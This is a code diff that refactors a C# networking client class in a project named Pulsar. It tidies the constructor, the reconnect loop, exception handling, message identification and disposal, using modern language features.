@@ -53,13 +53,13 @@ namespace Pulsar.Client.Networking
         public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
             : base(serverCertificate)
         {
-            this._hosts = hostsManager;
-            this._random = new SafeRandom();
+            _hosts = hostsManager;
+            _random = new SafeRandom();
             base.ClientState += OnClientState;
             base.ClientRead += OnClientRead;
             base.ClientFail += OnClientFail;
-            this._tokenSource = new CancellationTokenSource();
-            this._token = _tokenSource.Token;
+            _tokenSource = new CancellationTokenSource();
+            _token = _tokenSource.Token;
         }
 
         /// <summary>
@@ -67,14 +67,13 @@ namespace Pulsar.Client.Networking
         /// </summary>
         public void ConnectLoop()
         {
-            // TODO: do not re-use object
             while (!_token.IsCancellationRequested)
             {
                 if (!Connected)
                 {
-                    Host host = _hosts.GetNextHost();
+                    var host = _hosts.GetNextHost();
 
-                    if (host == null || host.IpAddress == null)
+                    if (host?.IpAddress == null)
                     {
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                         Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
@@ -97,7 +96,12 @@ namespace Pulsar.Client.Networking
                     {
                         _token.WaitHandle.WaitOne(1000);
                     }
-                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
+                    catch (NullReferenceException)
+                    {
+                        Disconnect();
+                        return;
+                    }
+                    catch (ObjectDisposedException)
                     {
                         Disconnect();
                         return;
@@ -118,9 +122,8 @@ namespace Pulsar.Client.Networking
         {
             if (!_identified)
             {
-                if (message.GetType() == typeof(ClientIdentificationResult))
+                if (message is ClientIdentificationResult reply)
                 {
-                    var reply = (ClientIdentificationResult)message;
                     _identified = reply.Result;
                 }
                 return;
@@ -131,7 +134,7 @@ namespace Pulsar.Client.Networking
 
         private void OnClientFail(Client client, Exception ex)
         {
-            Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
+            Debug.WriteLine($"Client Fail - Exception Message: {ex.Message}");
             client.Disconnect();
         }
 
@@ -178,16 +181,7 @@ namespace Pulsar.Client.Networking
             Disconnect();
         }
 
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this activity detection service.
-        /// </summary>
-        public void Dispose()
-        {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool disposing)
+        protected override void Dispose(bool disposing)
         {
             if (disposing)
             {
